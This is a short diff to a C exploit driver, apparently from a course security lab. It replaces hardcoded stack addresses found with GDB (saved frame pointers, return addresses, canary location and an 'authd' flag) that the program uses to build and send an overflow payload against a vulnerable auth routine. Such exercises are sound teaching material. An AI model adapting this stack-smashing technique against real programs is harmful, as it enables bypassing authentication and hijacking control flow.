@@ -128,17 +128,17 @@ int main(int argc, char* argv[]) {
    // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
    // to figure out and populate the following values
 
-   void *auth_bp = 0xffffc728;     // saved ebp for auth function
-   void *mainloop_bp = 0xffffd068; // saved ebp for main_loop
+   void *auth_bp = 0xbf990a48;     // saved ebp for auth function
+   void *mainloop_bp = 0xbf991388; // saved ebp for main_loop
    void *auth_ra = 0x08048968;     // return address for auth
-   void *mainloop_ra = 0x08048ef9; // return address for main_loop
+   void *mainloop_ra = 0x0804a266; // return address for main_loop
 
    // The following refer to locations on the stack
-   void *auth_user = 0xffffc590;   // value of user variable in auth
-   void *auth_canary_loc = 0xffffc6ec; // location where auth's canary is stored
-   void *auth_bp_loc = 0xffffc6f8; // location of auth's saved bp
-   void *auth_ra_loc = 0xffffc6fc; // location of auth's return address
-   void *g_authd = 0xffffc714;     // location of authd variable of g
+   void *auth_user = 0xbf9908b0;   // value of user variable in auth
+   void *auth_canary_loc = 0xbf990a0c; // location where auth's canary is stored
+   void *auth_bp_loc = 0xbf990a18; // location of auth's saved bp
+   void *auth_ra_loc = 0xbf990a1c; // location of auth's return address
+   void *g_authd = 0xbf990a34;     // location of authd variable of g
 
    // These values discovered above using GDB will vary across the runs, but the
    // differences between similar variables are preserved, so we compute those.
@@ -193,7 +193,7 @@ int main(int argc, char* argv[]) {
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();
-   
+
    put_str("l \n");
    send();
 
